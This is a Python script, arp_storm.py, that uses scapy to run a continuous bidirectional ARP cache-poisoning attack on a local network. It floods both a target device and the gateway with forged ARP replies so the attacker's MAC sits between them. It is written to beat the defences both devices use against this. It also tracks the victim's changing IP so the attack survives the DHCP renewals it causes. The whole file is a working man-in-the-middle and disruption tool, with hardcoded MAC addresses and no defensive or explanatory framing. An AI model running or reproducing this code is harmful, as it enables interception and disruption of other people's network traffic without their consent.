"""arp_storm.py -- unicast ARP poison storm against a single target.

Hammers the target's ARP cache with 100 unicast ARP replies/second claiming
the gateway IP belongs to our MAC. Defeats router-side gratuitous-ARP
counter-broadcasts and any client-side cache validation throttle.

Usage:
    python scripts/arp_storm.py "Wi-Fi 2" 192.168.0.16 <target_mac>
"""
from __future__ import annotations
import sys, time
from scapy.all import Ether, ARP, sendp  # type: ignore

iface = sys.argv[1] if len(sys.argv) > 1 else "Wi-Fi 2"
target_macs_input = sys.argv[2].lower() if len(sys.argv) > 2 else "80:96:98:26:1b:57"
target_macs = [m.strip() for m in target_macs_input.split(",")]
gateway_mac = sys.argv[3].lower() if len(sys.argv) > 3 else "70:5d:cc:b1:7e:40"
our_mac = "04:d3:b0:14:79:0e"
gateway_ip = "192.168.0.1"
rate_hz = 50 * len(target_macs)
interval = 1.0 / rate_hz

# Discover target IP dynamically each cycle by walking the OS ARP table.
# Surviving DHCP-induced IP changes is critical because our own ARP storm
# tends to spook the victim into requesting a new lease.
import re, subprocess
ARP_LINE = re.compile(r"^\s*(\d{1,3}(?:\.\d{1,3}){3})\s+([0-9a-f-]{17})", re.I)

def find_ip_for_mac(mac: str) -> str | None:
    norm = mac.lower().replace(":", "-")
    try:
        out = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=2).stdout
    except Exception:
        return None
    for line in out.splitlines():
        m = ARP_LINE.match(line)
        if m and m.group(2).lower() == norm:
            return m.group(1)
    return None

print(f"[arp_storm] target_macs={target_macs}  gw=({gateway_ip} {gateway_mac})  our_mac={our_mac}")
print(f"[arp_storm] bidirectional unicast flood at {rate_hz} pkt/s. Ctrl-C to stop.")

sent = 0
start = time.time()
current_target_ips: dict[str, str] = {}
last_refresh = 0.0

try:
    while True:
        now = time.time()
        # Refresh target IP every 3s (handles DHCP renewals)
        if now - last_refresh > 3.0:
            for tmac in target_macs:
                new_ip = find_ip_for_mac(tmac)
                if new_ip != current_target_ips.get(tmac):
                    print(f"[arp_storm] target IP for {tmac}: {current_target_ips.get(tmac)} -> {new_ip}")
                    if new_ip:
                        current_target_ips[tmac] = new_ip
            last_refresh = now
        
        if not current_target_ips:
            time.sleep(0.5)
            continue

        for tmac in target_macs:
            tip = current_target_ips.get(tmac)
            if not tip:
                continue
            
            # (a) target <- "gateway is at our_mac"  -- unicast to target MAC
            pkt_to_target = (
                Ether(src=our_mac, dst=tmac)
                / ARP(op=2, hwsrc=our_mac, psrc=gateway_ip,
                      hwdst=tmac, pdst=tip)
            )
            # (b) gateway <- "target is at our_mac"  -- UNICAST to gateway MAC
            pkt_to_gateway = (
                Ether(src=our_mac, dst=gateway_mac)
                / ARP(op=2, hwsrc=our_mac, psrc=tip,
                      hwdst=gateway_mac, pdst=gateway_ip)
            )
            sendp(pkt_to_target, iface=iface, verbose=False)
            sendp(pkt_to_gateway, iface=iface, verbose=False)
            sent += 2

        if sent % 100 == 0:
            print(f"[arp_storm] sent={sent}  rate={sent/(time.time()-start):.1f}/s  targets={list(current_target_ips.values())}")
        time.sleep(interval)
except KeyboardInterrupt:
    print(f"[arp_storm] stopped. total={sent}")
